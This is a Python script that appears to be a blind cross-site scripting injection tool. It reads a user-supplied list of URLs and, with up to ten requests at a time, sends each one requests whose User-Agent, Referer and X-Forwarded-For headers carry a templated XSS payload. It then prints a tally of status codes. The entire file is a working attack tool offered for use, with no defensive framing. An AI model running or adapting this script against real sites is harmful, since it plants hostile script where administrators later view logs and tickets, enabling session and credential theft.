import aiohttp
import asyncio
import os
from collections import defaultdict

# BXSS Payload
BXSS_PAYLOAD = "{{bxsspayload_update}}"

# Dictionary to store response counts
status_counts = defaultdict(int)
total_urls = 0

# Limit concurrent requests to avoid overwhelming the target
CONCURRENT_REQUESTS = 10
semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

# Retry settings
MAX_RETRIES = 1
TIMEOUT = 5


async def send_request(session, url):
    global status_counts

    headers = {
        "User-Agent": f"Mozilla/5.0 {BXSS_PAYLOAD}",
        "Referer": f"https://support.company.com/ticket/12345?msg={BXSS_PAYLOAD}",
        "X-Forwarded-For": f"192.168.1.1 {BXSS_PAYLOAD}",
    }

    async with semaphore:
        for attempt in range(MAX_RETRIES):
            try:
                async with session.get(
                    url, headers=headers, timeout=TIMEOUT
                ) as response:
                    status_code = response.status
                    status_counts[str(status_code)] += 1  # Store keys as strings
                    print(f"[+] Sent BXSS to: {url} - Status: {status_code}")
                    return
            except asyncio.TimeoutError:
                print(f"[-] Timeout: {url} (Attempt {attempt + 1}/{MAX_RETRIES})")
            except aiohttp.ClientError as e:
                print(f"[-] Request Failed: {url} - Error: {e}")

        status_counts["Failed"] += 1  # Count as failed after max retries


async def main():
    global total_urls

    # Let user select the list file
    file_path = input("Enter the path to your URL list file (e.g., list.txt): ")

    # Check if the file exists
    if not os.path.exists(file_path):
        print(f"[-] Error: File '{file_path}' not found!")
        return

    # Read URLs from file
    with open(file_path, "r") as file:
        urls = [line.strip() for line in file if line.strip()]

    total_urls = len(urls)

    # Start async HTTP session
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url) for url in urls]
        await asyncio.gather(*tasks)  # Run tasks concurrently

    # Final summary report
    print("\n[✅] BXSS Injection Completed!")
    print("========== Request Summary ==========")
    print(f"Total URLs Processed: {total_urls}")

    for status in sorted(status_counts.keys(), key=lambda x: (x.isdigit(), x)):
        print(f"  {status}: {status_counts[status]} requests")

    print("=====================================")


if __name__ == "__main__":
    asyncio.run(main())
